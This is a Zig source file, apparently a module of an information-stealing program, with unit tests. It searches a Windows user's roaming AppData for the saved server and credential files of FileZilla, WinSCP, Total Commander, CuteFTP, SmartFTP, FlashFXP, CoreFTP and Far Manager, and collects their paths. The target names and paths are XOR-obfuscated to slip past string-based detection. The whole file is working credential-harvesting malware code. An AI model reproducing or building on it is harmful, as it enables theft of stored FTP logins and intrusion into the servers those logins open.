const std = @import("std");
const hash = @import("../types/hash.zig");

pub const FtpEntry = struct {
    name: []const u8,
    files: [][]const u8,
};

const E = struct {
    pub const num_ftps = 8;
    pub const names = [num_ftps][]const u8{
        &hash.xorEncrypt("FileZilla"),
        &hash.xorEncrypt("WinSCP"),
        &hash.xorEncrypt("Total Commander"),
        &hash.xorEncrypt("Far Manager"),
        &hash.xorEncrypt("CuteFTP"),
        &hash.xorEncrypt("SmartFTP"),
        &hash.xorEncrypt("FlashFXP"),
        &hash.xorEncrypt("CoreFTP"),
    };
    pub const paths = [num_ftps][]const u8{
        &hash.xorEncrypt("FileZilla"),
        &hash.xorEncrypt("WinSCP.ini"),
        &hash.xorEncrypt("GHISLER"),
        &hash.xorEncrypt("Far Manager"),
        &hash.xorEncrypt("Globalscape\\CuteFTP"),
        &hash.xorEncrypt("SmartFTP\\Client 2.0"),
        &hash.xorEncrypt("FlashFXP"),
        &hash.xorEncrypt("FTPWare\\CoreFTP"),
    };
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn fileExists(path: []const u8) bool {
    var file = std.fs.openFileAbsolute(path, .{}) catch return false;
    file.close();
    return true;
}

fn listAllFiles(allocator: std.mem.Allocator, dir_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }
    return try files.toOwnedSlice();
}

fn listFilesByExt(allocator: std.mem.Allocator, dir_path: []const u8, ext: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        if (!std.mem.endsWith(u8, entry.name, ext)) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }
    return try files.toOwnedSlice();
}

fn collectFileZilla(allocator: std.mem.Allocator, base: []const u8) ![][]const u8 {
    const targets = [_][]const u8{ "recentservers.xml", "sitemanager.xml" };
    var result = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (result.items) |r| allocator.free(r);
        result.deinit();
    }
    for (targets) |t| {
        const fp = std.fs.path.join(allocator, &[_][]const u8{ base, t }) catch continue;
        if (fileExists(fp)) {
            try result.append(fp);
        } else {
            allocator.free(fp);
        }
    }
    return try result.toOwnedSlice();
}

fn collectWinSCPIni(allocator: std.mem.Allocator, path: []const u8) ![][]const u8 {
    if (!fileExists(path)) return try allocator.alloc([]const u8, 0);
    const result = try allocator.alloc([]const u8, 1);
    result[0] = try allocator.dupe(u8, path);
    return result;
}

fn collectFtpFiles(allocator: std.mem.Allocator, index: usize, full_path: []const u8) ![][]const u8 {
    switch (index) {
        0 => return collectFileZilla(allocator, full_path),
        1 => return collectWinSCPIni(allocator, full_path),
        2 => return listFilesByExt(allocator, full_path, ".ini"),
        3 => return listFilesByExt(allocator, full_path, ".ini"),
        4 => return listFilesByExt(allocator, full_path, ".dat"),
        5 => return listAllFiles(allocator, full_path),
        6 => return listFilesByExt(allocator, full_path, ".dat"),
        7 => return listFilesByExt(allocator, full_path, ".dat"),
        else => return allocator.alloc([]const u8, 0),
    }
}

pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const u8) ![]FtpEntry {
    _ = local;
    var entries = std.ArrayList(FtpEntry).init(allocator);
    errdefer {
        for (entries.items) |e| {
            allocator.free(e.name);
            for (e.files) |f| allocator.free(f);
            allocator.free(e.files);
        }
        entries.deinit();
    }

    inline for (0..E.num_ftps) |i| {
        const pe = E.paths[i];
        var path_buf: [pe.len]u8 = undefined;
        hash.xorDecrypt(pe, &path_buf);

        const full_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, &path_buf }) catch continue;

        if (i != 1) {
            if (!dirExists(full_path)) {
                allocator.free(full_path);
                continue;
            }
        }

        const files = collectFtpFiles(allocator, i, full_path) catch |err| {
            allocator.free(full_path);
            if (err == error.FileNotFound or err == error.NotDir or err == error.AccessDenied) continue;
            return err;
        };

        allocator.free(full_path);

        const ne = E.names[i];
        var name_buf: [ne.len]u8 = undefined;
        hash.xorDecrypt(ne, &name_buf);
        const name = allocator.dupe(u8, &name_buf) catch {
            for (files) |f| allocator.free(f);
            allocator.free(files);
            return error.OutOfMemory;
        };

        try entries.append(FtpEntry{ .name = name, .files = files });
    }

    return try entries.toOwnedSlice();
}

test "all FTP names decrypt correctly" {
    inline for (0..E.num_ftps) |i| {
        var buf: [E.names[i].len]u8 = undefined;
        hash.xorDecrypt(E.names[i], &buf);
        try std.testing.expect(buf.len > 0);
    }
}

test "FileZilla name decrypts" {
    var buf: [E.names[0].len]u8 = undefined;
    hash.xorDecrypt(E.names[0], &buf);
    try std.testing.expectEqualStrings("FileZilla", &buf);
}

test "collect returns empty for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer {
        for (result) |e| {
            std.testing.allocator.free(e.name);
            for (e.files) |f| std.testing.allocator.free(f);
            std.testing.allocator.free(e.files);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "WinSCP path is a file not directory" {
    var buf: [E.paths[1].len]u8 = undefined;
    hash.xorDecrypt(E.paths[1], &buf);
    try std.testing.expectEqualStrings("WinSCP.ini", &buf);
}
